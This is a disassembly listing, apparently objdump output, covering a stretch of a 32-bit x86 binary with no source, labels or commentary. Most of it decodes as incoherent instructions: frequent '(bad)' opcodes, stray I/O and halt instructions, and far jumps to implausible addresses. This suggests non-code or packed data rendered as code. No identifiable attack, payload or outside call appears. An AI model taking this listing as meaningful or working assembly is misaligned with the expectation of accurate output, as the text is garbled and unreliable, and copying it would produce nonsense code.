  402cde:	sti    
  402cdf:	outs   dx,BYTE PTR ds:[esi]
  402ce0:	add    eax,0x53efbe9
  402ce5:	jmp    0xf945efe4
  402cea:	or     cl,bh
  402cec:	add    al,0xe9
  402cee:	sti    
  402cef:	and    al,BYTE PTR ds:0x50afbe9
  402cf5:	test   eax,0xccabfb
  402cfa:	(bad)  
  402cfc:	pop    ss
  402cfd:	add    cl,ch
  402cff:	lahf   
  402d00:	push   ebx
  402d01:	add    cl,ch
  402d03:	(bad)  
  402d04:	adc    eax,DWORD PTR [eax]
  402d06:	jmp    0xf840e899
  402d0b:	in     al,dx
  402d0c:	sti    
  402d0d:	(bad)  
  402d0e:	call   0xe9409092
  402d13:	outs   dx,DWORD PTR ds:[esi]
  402d14:	and    eax,DWORD PTR [eax]
  402d16:	jmp    0xe940c889
  402d1b:	pop    edi
  402d1c:	add    eax,DWORD PTR [eax]
  402d1e:	jmp    0xe940b082
  402d23:	dec    edi
  402d24:	inc    ebx
  402d25:	add    cl,ch
  402d27:	dec    esi
  402d28:	fild   DWORD PTR [eax]
  402d2a:	stc    
  402d2b:	in     al,dx
  402d2c:	std    
  402d2d:	(bad)  
  402d2e:	call   0xe9405872
  402d33:	das    
  402d34:	jmp    0x402d35
  402d36:	call   0x402d3b
	...
  402d4f:	add    BYTE PTR [esi],ch
  402d51:	imul   eax,DWORD PTR [eax],0xffffffdd
  402d54:	in     al,dx
  402d55:	addr16 add cl,ch
  402d58:	pop    ds
  402d59:	dec    ebx
  402d5a:	add    cl,ch
  402d5c:	ud2    
  402d5e:	add    cl,ch
  402d60:	push   cs
  402d61:	stos   DWORD PTR es:[edi],eax
  402d62:	add    bl,bh
  402d64:	in     al,dx
  402d65:	out    dx,eax
  402d66:	(bad)  
  402d67:	call   0xe940886b
  402d6c:	out    dx,eax
  402d6d:	sbb    al,BYTE PTR [eax]
  402d6f:	jmp    0xe940b862
  402d74:	(bad)  
  402d76:	(bad)  
  402d77:	call   0xe940a85b
  402d7c:	iret   
  402d7d:	cmp    al,BYTE PTR [eax]
  402d7f:	jmp    0xf940f852
  402d84:	cli    
  402d85:	add    eax,0x5f2f600
  402d8a:	add    DWORD PTR [eax],eax
  402d8c:	into   
  402d8d:	add    dl,BYTE PTR [ecx]
  402d8f:	add    BYTE PTR [esi-0x43effefe],dl
  402d95:	add    al,BYTE PTR ds:0x102c400
  402d9b:	add    al,0x90
  402d9d:	cld    
  402d9e:	inc    eax
  402d9f:	add    BYTE PTR [eax+0x7d4000fc],cl
  402da5:	cld    
  402da6:	add    al,BYTE PTR [eax]
  402da8:	test   esp,edi
  402daa:	add    BYTE PTR [edx],al
  402dac:	push   ecx
  402dad:	cld    
  402dae:	and    BYTE PTR [eax],al
  402db0:	dec    ecx
  402db1:	cld    
  402db2:	add    BYTE PTR [eax],ah
	...
  402dcc:	add    BYTE PTR [edi],bh
  402dce:	cld    
  402dcf:	or     BYTE PTR [eax],al
  402dd1:	inc    edi
  402dd2:	cld    
  402dd3:	add    BYTE PTR [eax],cl
  402dd5:	push   ebx
  402dd6:	cld    
  402dd7:	add    BYTE PTR [eax],0x1d
  402dda:	(bad)  
  402ddb:	(bad)  
  402ddc:	(bad)  
  402ddd:	cmp    eax,0x420001fc
  402de2:	cld    
  402de3:	add    BYTE PTR [ecx],0x4e
  402de6:	cld    
  402de7:	sbb    BYTE PTR [eax],al
  402de9:	push   ss
  402dea:	cld    
  402deb:	add    BYTE PTR [eax],bl
  402ded:	cmp    al,0xfc
  402def:	push   es
  402df0:	add    BYTE PTR [esp+edi*8+0x0],al
  402df4:	push   es
  402df5:	adc    ah,bh
  402df7:	pusha  
  402df8:	add    BYTE PTR [eax],cl
  402dfa:	cld    
  402dfb:	add    BYTE PTR [eax-0x3],ah
  402dfe:	sti    
  402dff:	add    eax,DWORD PTR [eax]
  402e01:	add    eax,0xd10300fc
  402e06:	std    
  402e07:	xor    BYTE PTR [eax],al
  402e09:	leave  
  402e0a:	std    
  402e0b:	add    BYTE PTR [eax],dh
  402e0d:	mov    edi,0xc7000cfd
  402e12:	std    
  402e13:	add    BYTE PTR [ebx+edx*8],cl
  402e16:	std    
  402e17:	rol    BYTE PTR [eax],0x9d
  402e1a:	std    
  402e1b:	(bad)  
  402e1c:	push   esp
  402e1e:	retf   
  402e1f:	add    edx,DWORD PTR [ecx]
  402e21:	hlt    
  402e22:	int    0x3
  402e24:	add    ah,dh
  402e26:	rol    DWORD PTR [ebx],cl
  402e28:	pop    es
  402e29:	hlt    
  402e2a:	aam    0x3
  402e2c:	push   es
  402e2d:	hlt    
  402e2e:	in     eax,0x3
  402e30:	add    eax,0x0
	...
  402e49:	add    ah,dh
  402e4b:	out    0x3,al
  402e4d:	add    al,0xf4
  402e4f:	iret   
  402e50:	add    eax,DWORD PTR [ebx]
  402e52:	hlt    
  402e53:	fadd   DWORD PTR [ebx]
  402e55:	add    dh,ah
  402e57:	loope  0x402e5c
  402e59:	add    esp,esi
  402e5b:	stos   BYTE PTR es:[edi],al
  402e5c:	add    eax,DWORD PTR [eax]
  402e5e:	hlt    
  402e5f:	fild   DWORD PTR [ebx]
  402e61:	add    ah,dh
  402e63:	xor    DWORD PTR [ebx],edx
  402e65:	pop    es
  402e66:	jmp    0x402e67
  402e68:	fs push cs
  402e6a:	dec    edx
  402e6b:	push   esi
  402e6c:	xor    al,0x9
  402e6e:	ins    DWORD PTR es:[edi],dx
  402e6f:	add    eax,0x5af36dc8
  402e74:	xlat   BYTE PTR ds:[ebx]
  402e75:	push   0xffffffc4
  402e77:	test   al,0xa8
  402e79:	arpl   WORD PTR [ebp+0x3f],cx
  402e7c:	js     0x402ee2
  402e7e:	xchg   edx,eax
  402e7f:	mov    ?,WORD PTR [ebx-0x25]
  402e82:	cli    
  402e83:	aas    
  402e84:	mov    ebx,esp
  402e86:	popf   
  402e87:	mov    cl,0xdc
  402e89:	aad    0x14
  402e8b:	lods   al,BYTE PTR fs:[esi]
  402e8d:	shr    BYTE PTR [ebx-0x9],cl
  402e90:	aas    
  402e91:	mov    dh,0xfd
  402e93:	push   0xda82b14f
  402e98:	and    BYTE PTR [eax-0x410fb2ed],bh
  402e9e:	test   BYTE PTR [edi+0xe09b6f3],dh
  402ea4:	and    esi,DWORD PTR [eax-0x46ab5bb2]
  402eaa:	out    0xf9,eax
  402eac:	inc    ebx
  402ead:	mov    esi,0x0
	...
  402ec6:	add    BYTE PTR [eax+0x4],bh
  402ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eca:	mov    bh,0xae
  402ecc:	out    dx,al
  402ecd:	adc    edi,esp
  402ecf:	mov    eax,ds:0xa098b857
  402ed4:	shl    BYTE PTR [esi],1
  402ed6:	mov    bh,al
  402ed8:	test   DWORD PTR [edi+0x28f6186b],ebx
  402ede:	fwait
  402edf:	punpcklwd mm6,DWORD PTR [ebx-0x34]
  402ee3:	push   ss
  402ee4:	enter  0xbbfd,0x19
  402ee8:	jg     0x402f20
  402eea:	xor    ch,dh
  402eec:	lock mov edi,0x4a65fa60
  402ef2:	por    mm1,mm6
  402ef5:	aam    0xff
  402ef7:	sti    
  402ef8:	ja     0x402eab
  402efa:	and    al,0xda
  402efc:	or     eax,0x38ccf41f
  402f01:	int    0x43
  402f03:	aam    0xaf
  402f05:	cmp    edx,DWORD PTR [ebx-0x25]
  402f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f09:	mov    eax,0x2608f7e8
  402f0e:	mov    eax,0x87943df8
  402f13:	jmp    0xfed731ce
  402f18:	lahf   
  402f19:	sbb    DWORD PTR [ecx+eiz*2+0x666c0d0f],0x46
  402f21:	lahf   
  402f22:	mov    ebx,0xcb29ad5f
  402f27:	push   eax
  402f28:	cwde   
  402f29:	dec    edx
  402f2a:	pusha  
	...
  402f43:	add    BYTE PTR [esi+edx*1],ch
  402f46:	aam    0x2f
  402f48:	and    edi,DWORD PTR [edi]
  402f4a:	jmp    DWORD PTR es:[ecx]
  402f4d:	test   al,0xb0
  402f4f:	push   cs
  402f50:	lds    ebx,FWORD PTR [ebp+edx*4+0x31fcd14]
  402f57:	add    al,0xc2
  402f59:	add    BYTE PTR ss:[ecx+0x27],ch
  402f5d:	mov    al,0xc8
  402f5f:	xlat   BYTE PTR ds:[ebx]
  402f60:	push   esi
  402f61:	mov    ch,0xbf
  402f63:	pop    esp
  402f64:	lods   al,BYTE PTR ds:[esi]
  402f65:	xchg   ecx,eax
  402f66:	and    edx,ecx
  402f68:	mov    ebx,0x43705694
  402f6d:	mov    ecx,edi
  402f6f:	ficomp WORD PTR [edx-0x76]
  402f72:	mov    eax,0x28037867
  402f77:	icebp  
  402f78:	pop    ds
  402f79:	add    bl,BYTE PTR [edi+0x3b]
  402f7c:	dec    edi
  402f7d:	stc    
  402f7e:	(bad)
  402f81:	cld    
  402f82:	mov    al,0x6e
  402f84:	cmp    ebx,DWORD PTR [eax+0x2f]
  402f87:	clc    
  402f88:	ret    
  402f89:	pop    esp
  402f8a:	pop    eax
  402f8b:	or     BYTE PTR [edx+0x130cc165],0x5f
  402f92:	mov    dh,0x59
  402f94:	mov    dh,0xa8
  402f96:	jbe    0x402f7f
  402f98:	(bad)  
  402f99:	stos   DWORD PTR es:[edi],eax
  402f9a:	add    DWORD PTR [ebp+0x17],esi
  402f9d:	mov    bl,0x98
  402f9f:	add    ecx,DWORD PTR [eax-0x4f]
  402fa2:	out    dx,eax
  402fa3:	jo     0x403017
  402fa5:	xchg   esi,eax
  402fa6:	jno    0x402fa6
	...
  402fc0:	add    BYTE PTR [edx-0x71],ch
  402fc3:	push   es
  402fc4:	dec    esp
  402fc5:	push   ebx
  402fc6:	mov    BYTE PTR [edi-0x17729426],bl
  402fcc:	dec    ebx
  402fcd:	outs   dx,BYTE PTR ds:[esi]
  402fce:	add    BYTE PTR [eax-0x4b],bh
  402fd1:	cs add eax,0xfe7f670f
  402fd7:	xchg   ebp,eax
  402fd8:	rcr    DWORD PTR [edi+0xaa2e0f6],1
  402fde:	pop    esi
  402fdf:	jg     0x402fed
  402fe1:	repz pop ecx
  402fe3:	or     BYTE PTR [esi-0x65],bh
  402fe6:	pusha  
  402fe7:	xchg   ecx,eax
  402fe8:	call   0x1269410
  402fed:	sub    DWORD PTR [ebx],edx
  402fef:	imul   ebp,DWORD PTR [ebx-0x51],0x62
  402ff3:	ins    BYTE PTR es:[edi],dx
  402ff4:	sbb    al,0x5
  402ff6:	hlt    
  402ff7:	test   DWORD PTR fs:[ebx+0x3],esi
  402ffb:	(bad)  
  402ffd:	loopne 0x40304d
  402fff:	push   es
  403000:	ins    BYTE PTR es:[edi],dx
  403001:	xchg   esi,eax
  403002:	sahf   
  403003:	add    DWORD PTR [ebx],ebx
  403005:	or     al,0xb0
  403007:	or     BYTE PTR [edx-0xaf04096],al
  40300d:	fistp  DWORD PTR [edx-0x55829a50]
  403013:	mov    bh,0x12
  403015:	idiv   DWORD PTR [ebx-0x42]
  403018:	mov    esp,DWORD PTR [ecx]
  40301a:	dec    esp
  40301b:	mov    ecx,0xdcddb2fc
  403020:	(bad)  
  403021:	(bad)  
  403022:	in     eax,dx
  403023:	fst    DWORD PTR ds:0x0
	...
  40303d:	add    BYTE PTR [esi-0x47732cc4],bl
  403043:	or     al,0xd4
  403045:	sti    
  403046:	adc    eax,0x934db262
  40304b:	adc    DWORD PTR [ebp-0x43fee6c6],esi
  403051:	mov    ds:0xd4baf03f,eax
  403056:	sbb    al,0xa6
  403058:	fisttp WORD PTR [edx-0x76]
  40305b:	push   ebp
  40305c:	fdivr  DWORD PTR ds:0xa4d1c4f0
  403062:	xchg   BYTE PTR [esi+edx*8+0x69aa07d3],dh
  403069:	inc    ebx
  40306a:	mov    eax,ds:0xcb346e99
  40306f:	dec    eax
  403070:	lods   eax,DWORD PTR ds:[si]
  403072:	ins    DWORD PTR es:[edi],dx
  403073:	js     0x4030d5
  403075:	fisubr DWORD PTR [esi]
  403077:	in     al,dx
  403078:	add    eax,DWORD PTR [eax+edi*4-0x23]
  40307c:	add    dh,BYTE PTR [ebx]
  40307e:	hlt    
  40307f:	mov    ?,WORD PTR [edi]
  403081:	or     bl,BYTE PTR [esi-0x36f2b7db]
  403087:	add    BYTE PTR [ebp+0x5],dl
  40308a:	inc    esp
  40308b:	jb     0x4030d2
  40308d:	add    dl,BYTE PTR [ebx]
  40308f:	lods   al,BYTE PTR ds:[esi]
  403090:	repz or dl,BYTE PTR [edx-0x42f3dba2]
  403097:	mov    ecx,0x2b2b6890
  40309c:	sub    DWORD PTR [edi+0x14],0x66afe5
	...
  4030bb:	ins    DWORD PTR es:[edi],dx
  4030bc:	push   edi
  4030bd:	loopne 0x403120
  4030bf:	mov    edx,0x42deccce
  4030c4:	fs mov ebp,0x6bb9cdd9
  4030ca:	rol    BYTE PTR [eax+edx*1-0x64],1
  4030ce:	xlat   BYTE PTR ds:[ebx]
  4030cf:	mov    bl,0xc7
  4030d1:	or     BYTE PTR [ebx-0x4c07a2e3],dh
  4030d7:	retf   0x27f2
  4030da:	mov    ebp,0xba5749ab
  4030df:	xor    al,0xfc
  4030e1:	xchg   BYTE PTR [eax-0x4069b1af],bh
  4030e7:	jle    0x4030c9
  4030e9:	in     eax,0xb6
  4030eb:	div    DWORD PTR [ecx]
  4030ed:	mov    ch,0xb1
  4030ef:	shl    ah,0x42
  4030f2:	aad    0x4e
  4030f4:	aaa    
  4030f5:	push   edx
  4030f6:	rcr    BYTE PTR [ecx-0x37],cl
  4030f9:	and    ebx,ebx
  4030fb:	clc    
  4030fc:	pop    edx
  4030fd:	icebp  
  4030fe:	(bad)  [edi+0x1762fea9]
  403104:	pusha  
  403105:	push   cs
  403106:	or     BYTE PTR fs:[esi+0x44016d5d],0x2d
  40310e:	push   0xffffff8e
  403110:	add    al,0xf2
  403112:	mov    edx,0xca7ce0f2
  403117:	in     eax,dx
  403118:	jno    0x403128
  40311a:	call   0x0:0x6997faf4
	...
  403135:	add    BYTE PTR [eax],al
  403137:	add    bl,dh
  403139:	inc    edi
  40313a:	lods   eax,DWORD PTR ds:[esi]
  40313b:	jbe    0x403130
  40313d:	aam    0x1b
  40313f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403140:	in     al,dx
  403141:	jge    0x403104
  403143:	aad    0xf5
  403145:	out    0x2e,al
  403147:	(bad)
  40314a:	les    esi,FWORD PTR [edx]
  40314c:	push   esi
  40314d:	into   
  40314e:	xor    ah,BYTE PTR [edx+0x51]
  403151:	test   DWORD PTR [eax+0x5ec2011],ebx
  403157:	add    DWORD PTR [edi],ebx
  403159:	push   edi
  40315a:	jg     0x40314a
  40315c:	mov    esi,0x7bc71e09
  403162:	xchg   ebx,eax
  403163:	dec    ebp
  403164:	scas   al,BYTE PTR es:[edi]
  403165:	hlt    
  403166:	sbb    al,0x3d
  403168:	test   eax,0x3da9565d
  40316d:	retf   
  40316e:	loopne 0x403149
  403170:	cmp    dh,BYTE PTR [esi+0x2a]
  403173:	mov    ch,BYTE PTR [ebx-0x5b854c13]
  403179:	shl    DWORD PTR fs:[ebp+0x753fae4a],1
  403180:	inc    ebp
  403181:	mov    ds:0xc2cc6ad,eax
  403186:	sbb    edx,esi
  403188:	sub    esi,DWORD PTR ds:0xb37f6198
  40318e:	push   es
  40318f:	xor    DWORD PTR [eax-0x62],edi
  403192:	mov    ah,0x2
  403194:	imul   eax,DWORD PTR ds:0x3c661222,0x1da3
	...
  4031b2:	add    BYTE PTR [eax],al
  4031b4:	add    cl,dh
  4031b6:	lods   al,BYTE PTR ds:[esi]
  4031b7:	sub    eax,0x95eded
  4031bc:	jg     0x403190
  4031be:	add    DWORD PTR [esi],esi
  4031c0:	or     DWORD PTR [edx+0x1d2a4100],edi
  4031c6:	fbstp  TBYTE PTR fs:[esp+ecx*2+0x6e46a85d]
  4031ce:	xor    esi,DWORD PTR [ecx]
  4031d0:	sar    BYTE PTR [ebp+0x2e],1
  4031d3:	inc    esi
  4031d4:	jne    0x40315f
  4031d6:	es retf 
  4031d8:	jecxz  0x40324a
  4031da:	sub    edi,DWORD PTR [ecx+ecx*4-0x8dacb76]
  4031e1:	shr    DWORD PTR ds:0x11257c52,1
  4031e7:	int3   
  4031e8:	jmp    0x6a6:0x50bb1034
  4031ef:	and    bh,BYTE PTR [esi+0x475509d5]
  4031f5:	icebp  
  4031f6:	jle    0x4031bd
  4031f8:	rcr    DWORD PTR [eax-0x1da44d7f],1
  4031fe:	js     0x40322b
  403200:	in     eax,0x29
  403202:	js     0x403260
  403204:	mov    gs,WORD PTR [esp+ebx*8-0x2ac2e73e]
  40320b:	mov    ch,0x62
  40320d:	fstp   st(5)
  40320f:	sub    al,0xec
  403211:	(bad)  
  403212:	jecxz  0x40326f
  403214:	jns    0x40324f
  403216:	sub    DWORD PTR [ebx+0x7],ebx
	...
  403230:	add    BYTE PTR [eax],al
  403232:	inc    edx
  403233:	sub    ah,ch
  403235:	push   ebp
  403236:	cwde   
  403237:	das    
  403238:	jne    0x40321d
  40323a:	shl    BYTE PTR [ecx],0x2
  40323d:	push   eax
  40323e:	cmc    
  40323f:	or     eax,0x12e5de9c
  403244:	jmp    0x4032b2
  403246:	xchg   esp,eax
  403247:	or     esi,DWORD PTR [edx-0x6]
  40324a:	in     al,0x4
  40324c:	add    eax,0xbf018f00
  403251:	xchg   ebp,eax
  403252:	inc    ecx
  403253:	push   edx
  403254:	mov    eax,0xb120bbe2
  403259:	jnp    0x4032a0
  40325b:	mov    cl,0xb5
  40325d:	or     al,0x76
  40325f:	rcl    BYTE PTR ds:[edx-0x1a2a71f8],cl
  403266:	xchg   edx,eax
  403267:	(bad)  
  403269:	jl     0x403267
  40326b:	ins    DWORD PTR es:[edi],dx
  40326c:	fisttp DWORD PTR [ebx]
  40326e:	add    DWORD PTR [edx-0x2d],edi
  403271:	xchg   BYTE PTR [edi+0x5f1d4a9],cl
  403277:	cdq    
  403278:	(bad)  [eax-0x75]
  40327b:	mov    dl,bl
  40327d:	pop    ds
  40327e:	or     BYTE PTR [esi-0x1a497e43],dh
  403284:	mov    eax,0xb054fcf6
  403289:	outs   dx,DWORD PTR ds:[esi]
  40328a:	add    BYTE PTR [edi+esi*4+0x18],0xf3
  40328f:	icebp  
  403290:	pop    es
  403291:	mov    BYTE PTR ds:0xff0f62,bl
	...
  4032af:	xlat   BYTE PTR ds:[ebx]
  4032b0:	adc    BYTE PTR [esi],al
  4032b2:	data16 jns 0x403275
  4032b5:	add    BYTE PTR [ecx],dl
  4032b7:	call   0x629b:0x248f652a
  4032be:	clc    
  4032bf:	scas   al,BYTE PTR es:[edi]
  4032c0:	retf   
  4032c1:	imul   esp,DWORD PTR [ecx+0x10],0x7c
  4032c5:	ins    BYTE PTR es:[edi],dx
  4032c6:	push   ss
  4032c7:	mov    ch,0xa6
  4032c9:	or     ah,BYTE PTR [eax-0x28f289d5]
  4032cf:	icebp  
  4032d0:	xchg   DWORD PTR [esi+ecx*2],eax
  4032d3:	lahf   
  4032d4:	xchg   edi,eax
  4032d5:	add    edi,DWORD PTR [ecx]
  4032d7:	in     al,dx
  4032d8:	and    ah,BYTE PTR [edi-0x59]
  4032db:	bound  esi,QWORD PTR [edx-0x170b2fa1]
  4032e1:	imul   edi,DWORD PTR ds:[ebp-0x1d91b08a],0x4ad159f7
  4032ec:	mov    eax,ds:0x132dd62a
  4032f1:	sti    
  4032f2:	fidiv  WORD PTR [ebp+edi*1+0x7ecbd80b]
  4032f9:	xchg   ebp,eax
  4032fa:	mov    esp,0xbb65e84d
  4032ff:	rcr    bl,cl
  403301:	mov    dh,0xb2
  403303:	xor    eax,DWORD PTR [ebp-0x39]
  403306:	mov    ch,0x24
  403308:	test   al,0xd1
  40330a:	mov    ebp,0xbac23699
  40330f:	mov    esi,0xb372bc
	...
  40332c:	daa    
  40332d:	mov    ah,BYTE PTR [ebx+0xdb118b4]
  403333:	sar    BYTE PTR [esi+0x3f],1
  403336:	(bad)  
  403337:	(bad)  
  403338:	rol    ebp,0x2e
  40333b:	fiadd  WORD PTR [eax+0x53]
  40333e:	pop    edi
  40333f:	(bad)  
  403341:	(bad)  [ecx+0x66]
  403344:	addr16 inc esp
  403346:	cmp    ah,BYTE PTR [ecx-0x48]
  403349:	scas   al,BYTE PTR es:[edi]
  40334a:	jmp    0xce6f:0x1b582967
  403351:	and    al,BYTE PTR [esi+0x758d400b]
  403357:	or     al,0x37
  403359:	mov    bh,0xa6
  40335b:	add    eax,0x2d660ce
  403360:	adc    DWORD PTR [ebx+eax*1+0x14ecf400],ebp
  403367:	sbb    ebp,ebp
  403369:	sub    eax,0x6f063661
  40336e:	xor    ch,BYTE PTR ds:0xc0ed050f
  403374:	enter  0x2428,0xd0
  403378:	stos   DWORD PTR es:[edi],eax
  403379:	aas    
  40337a:	outs   dx,DWORD PTR ds:[esi]
  40337b:	sahf   
  40337c:	into   
  40337d:	pop    edx
  40337e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40337f:	ins    DWORD PTR es:[edi],dx
  403380:	mov    ch,0x51
  403382:	icebp  
  403383:	jns    0x4033c2
  403385:	int    0x30
  403387:	mov    esi,DWORD PTR [esi]
  403389:	aam    0x63
  40338b:	fistp  DWORD PTR [ebx]
  40338d:	mov    edi,0xaca2
	...
  4033a6:	add    BYTE PTR [eax],al
  4033a8:	add    BYTE PTR [eax],cl
  4033aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033ab:	cmc    
  4033ac:	ss inc ecx
  4033ae:	jno    0x40335c
  4033b0:	inc    ebp
  4033b1:	mov    ds:0x77186777,al
  4033b6:	mov    ds:0x898be71e,al
  4033bb:	cwde   
  4033bc:	icebp  
  4033bd:	mov    ch,0x4e
  4033bf:	fldenv [edx]
  4033c1:	lods   eax,DWORD PTR ds:[esi]
  4033c2:	push   ebp
  4033c3:	sbb    dl,BYTE PTR [ebx-0x40]
  4033c6:	cmp    al,0x5b
  4033c8:	inc    esp
  4033c9:	shl    DWORD PTR [ebx],cl
  4033cb:	mov    esp,0xf4f28aae
  4033d0:	(bad)  [ecx-0x7]
  4033d3:	cmp    eax,0x77208c90
  4033d8:	jg     0x403451
  4033da:	pop    es
  4033db:	mov    al,ds:0xe186ff6b
  4033e0:	pushf  
  4033e1:	hlt    
  4033e2:	popf   
  4033e3:	adc    cl,cl
  4033e5:	fnstenv [ebx+edx*2-0x46]
  4033e9:	retf   0x446b
  4033ec:	daa    
  4033ed:	add    ebp,DWORD PTR [ebx-0x3e1fa803]
  4033f3:	mov    dh,0x5
  4033f5:	mov    ch,0xd8
  4033f7:	outs   dx,DWORD PTR ds:[esi]
  4033f8:	idiv   BYTE PTR [ebp+0x70208bcf]
  4033fe:	xchg   edi,eax
  4033ff:	retf   0x72ef
  403402:	nop
  403403:	add    BYTE PTR [ecx],cl
  403405:	or     dh,BYTE PTR [edi-0x59]
  403408:	dec    eax
  403409:	mov    cl,0x6b
  40340b:	mov    esi,0x4f
	...
  403424:	add    BYTE PTR [eax],al
  403426:	push   edi
  403427:	lods   al,BYTE PTR ds:[esi]
  403428:	icebp  
  403429:	xchg   BYTE PTR [eax-0x4b],ch
  40342c:	call   0xc422a8fe
  403431:	add    al,0x86
  403433:	(bad)  
  403434:	ficom  DWORD PTR [ebx-0x7e]
  403437:	pop    edi
  403438:	pop    ebp
  403439:	xchg   edx,eax
  40343a:	cdq    
  40343b:	dec    edx
  40343c:	inc    esp
  40343d:	rol    DWORD PTR [ebx+0x2d],0x6f
  403441:	add    BYTE PTR [ebx],bh
  403443:	xor    al,0x76
  403445:	xchg   edi,eax
  403446:	popf   
  403447:	repz cmp BYTE PTR [esi+0x1e],cl
  40344b:	jmp    0x40346c
  40344d:	add    eax,0xbc0b07ef
  403452:	out    dx,eax
  403453:	and    BYTE PTR [edx],dl
  403455:	cmp    ch,dl
  403457:	inc    esi
  403458:	fistp  QWORD PTR [ebx-0x2f]
  40345b:	popa   
  40345c:	(bad)  
  40345d:	mov    eax,0xf9ed351b
  403462:	and    ch,BYTE PTR [esp+esi*8]
  403465:	push   ds
  403466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403467:	jmp    0x403423
  403469:	push   edi
  40346a:	mov    dh,0xf6
  40346c:	mov    eax,ds:0x8921269c
  403471:	aad    0x57
  403473:	or     BYTE PTR [eax+0x17a06c02],dl
  403479:	inc    ebx
  40347a:	or     ecx,DWORD PTR [ecx+0x6e51700e]
  403480:	and    eax,0x3c73a8b1
  403485:	out    0x2e,al
  403487:	mov    ah,0x73
  403489:	lahf   
	...
  4034a2:	add    BYTE PTR [edi],ch
  4034a4:	lods   eax,DWORD PTR ds:[esi]
  4034a5:	push   0x54
  4034a7:	pop    ebp
  4034a8:	leave  
  4034a9:	inc    ecx
  4034aa:	or     eax,0x58defe
  4034af:	dec    eax
  4034b0:	stc    
  4034b1:	js     0x4034a3
  4034b3:	sbb    DWORD PTR [edi+0x62],eax
  4034b6:	jmp    0xc28f4b95
  4034bb:	fwait
  4034bc:	test   al,0x53
  4034be:	fisttp DWORD PTR [esi+edi*1+0x15]
  4034c2:	xchg   esp,eax
  4034c3:	fisttp QWORD PTR [ebp-0x246172f2]
  4034c9:	and    esp,DWORD PTR [esi-0x40c794b1]
  4034cf:	and    BYTE PTR [edi-0x60],bh
  4034d2:	cmp    cl,ah
  4034d4:	aam    0xbb
  4034d6:	and    DWORD PTR [edx+0x630a96a0],edx
  4034dc:	xor    cl,BYTE PTR [ebp-0x33fbfbed]
  4034e2:	pop    esp
  4034e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034e4:	adc    dl,bh
  4034e6:	inc    ebp
  4034e7:	push   esi
  4034e8:	es cli 
  4034ea:	outs   dx,BYTE PTR ds:[esi]
  4034eb:	pop    ss
  4034ec:	cmc    
  4034ed:	loopne 0x403566
  4034ef:	jns    0x4034d7
  4034f1:	mov    edx,0xa057a8ba
  4034f6:	mov    ds:0x888d08eb,eax
  4034fb:	sub    bh,BYTE PTR [edx+0x2b7d9195]
  403501:	xlat   BYTE PTR ds:[ebx]
  403502:	fisubr WORD PTR [edx+ebx*4+0xc7cc]
	...
  40351d:	add    BYTE PTR [eax],al
  40351f:	add    bh,ch
  403521:	int    0xe1
  403523:	in     al,dx
  403524:	push   ds
  403525:	jge    0x403521
  403527:	cmc    
  403528:	push   ecx
  403529:	jo     0x40358d
  40352b:	jb     0x4034dd
  40352d:	loope  0x4035a8
  40352f:	imul   esp,ebx,0xffffff8e
  403532:	push   esp
  403533:	inc    eax
  403534:	xor    al,BYTE PTR [eax+0x4f]
  403537:	pop    ecx
  403538:	xor    eax,0xf4160e17
  40353d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40353e:	adc    al,0xf
  403540:	hlt    
  403541:	jae    0x403577
  403543:	cmp    BYTE PTR [eax],bl
  403545:	xor    eax,DWORD PTR [ebp+0x23]
  403548:	sbb    DWORD PTR [edi-0x382602d1],ecx
  40354e:	pop    esi
  40354f:	out    0xc8,al
  403551:	adc    BYTE PTR ds:0xfc49abcb,cl
  403557:	iret   
  403558:	stos   BYTE PTR es:[edi],al
  403559:	dec    edx
  40355a:	jb     0x4034ed
  40355c:	cmc    
  40355d:	mov    esp,DWORD PTR [ebx-0x3032f376]
  403563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403564:	out    0xd,eax
  403566:	sar    DWORD PTR [esi+ecx*8+0x6124a556],0x8f
  40356e:	aam    0x3f
  403570:	inc    eax
  403571:	enter  0x1286,0x63
  403575:	shl    DWORD PTR [ebp+0x9],0x72
  403579:	xchg   edx,eax
  40357a:	call   0x1992f2c6
  40357f:	push   ebx
  403580:	les    eax,FWORD PTR ds:0x7e4a
	...
  40359a:	add    BYTE PTR [eax],al
  40359c:	add    bh,bl
  40359e:	les    edi,FWORD PTR [edx]
  4035a0:	gs (bad) 
  4035a2:	(bad)  
  4035a3:	cmp    al,0x3f
  4035a5:	and    esi,DWORD PTR [edi]
  4035a7:	dec    esp
  4035a8:	and    al,0x2
  4035aa:	sbb    BYTE PTR [esi],0x9
  4035ad:	loope  0x403567
  4035af:	in     eax,dx
  4035b0:	adc    eax,esi
  4035b2:	sbb    DWORD PTR [eax-0x6ea4c0ad],eax
  4035b8:	dec    eax
  4035b9:	inc    esi
  4035ba:	pushf  
  4035bb:	loope  0x403622
  4035bd:	sbb    eax,0x147eb2dd
  4035c2:	push   es
  4035c3:	mov    bh,0xe6
  4035c5:	fwait
  4035c6:	inc    ebp
  4035c8:	std    
  4035c9:	mov    bh,BYTE PTR [eax]
  4035cb:	xchg   esp,eax
  4035cc:	shr    BYTE PTR [ecx-0x57349c8f],1
  4035d2:	add    eax,0x827df9e3
  4035d7:	mov    ds:0x519b850a,al
  4035dc:	pop    eax
  4035dd:	mov    al,ds:0x93291074
  4035e2:	ins    DWORD PTR es:[edi],dx
  4035e3:	xor    bl,BYTE PTR [edi+esi*2+0x6c6cf2fa]
  4035ea:	jecxz  0x40358b
  4035ec:	mov    ebp,0xce610c89
  4035f1:	mov    dl,BYTE PTR ds:0x5e236136
  4035f7:	out    dx,eax
  4035f8:	das    
  4035f9:	and    BYTE PTR [edi-0x5c],al
  4035fc:	add    bh,BYTE PTR ds:0x115d30
	...
  40361a:	cmp    DWORD PTR ss:[edx],ebp
  40361d:	push   ss
  40361e:	scas   al,BYTE PTR es:[edi]
  40361f:	mov    cl,0xeb
  403621:	out    0xb4,al
  403623:	stos   BYTE PTR es:[edi],al
  403624:	test   al,0x33
  403626:	nop
  403627:	ret    
  403628:	imul   eax,DWORD PTR [ebx+eax*4-0x24],0x962adaae
  403630:	out    0xa9,eax
